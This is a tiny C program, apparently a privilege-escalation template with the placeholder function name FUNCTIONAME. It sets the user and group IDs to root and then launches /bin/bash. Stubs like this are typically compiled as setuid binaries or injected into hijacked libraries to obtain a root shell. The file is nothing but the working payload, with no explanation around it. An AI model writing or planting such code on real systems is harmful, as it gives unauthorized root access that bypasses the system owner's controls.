#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
void FUNCTIONAME()
{
        setuid(0);
        setgid(0);
        execl("/bin/bash","sh",(char *)0);
}
int main(void)
{
        FUNCTIONAME();
}
